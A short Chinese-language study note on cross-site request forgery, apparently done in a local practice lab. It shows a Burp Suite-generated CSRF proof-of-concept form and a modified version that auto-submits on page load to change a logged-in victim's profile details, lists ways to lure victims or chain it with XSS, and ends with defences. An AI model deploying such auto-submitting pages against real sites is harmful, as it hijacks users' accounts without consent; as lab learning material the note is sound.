# CSRF漏洞

受害者离开但还是登录状态时，诱导受害者点击带有csrf poc的网页。


截包
![[Pasted image 20211207162210.png]]

右键Engagement tools -> Generate csrf poc


```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://192.168.50.42/06/vul/csrf/csrfget/csrf_get_edit.php">
      <input type="hidden" name="sex" value="mmmmmmmmmmmmmmm" />
      <input type="hidden" name="phonenum" value="aaaa" />
      <input type="hidden" name="add" value="aaa" />
      <input type="hidden" name="email" value="aaa" />
      <input type="hidden" name="submit" value="submit" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

```

改造一下：受害者点到了就被修改信息：

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <script>history.pushState('', '', '/')</script>
    <form action="http://192.168.50.42/06/vul/csrf/csrfget/csrf_get_edit.php">
      <input type="hidden" name="sex" value="aaaaa" />
      <input type="hidden" name="phonenum" value="aaaaa" />
      <input type="hidden" name="add" value="ffffffffff" />
      <input type="hidden" name="email" value="pppppp@qqqqqqqppp" />
      <input type="hidden" name="submit" value="submit" />
      <input type="submit" value="Submit request" />
    </form>
    <script type="text/javascript">
      window.onload = function(){
        const element = document.querySelector('input[type="submit"]')
        element.click()
      }
    </script>
  </body>
</html>

```


利用方法：
1. 受害者登录状态下诱导点击带有csrf POC的网址。
2. 找到xss注入点 结合xss注入漏洞访问带有csrf POC的网址。



防御方法：

1. 加csrf token
2. 设置session过期时间
3. 限制更改信息请求header处的referrer



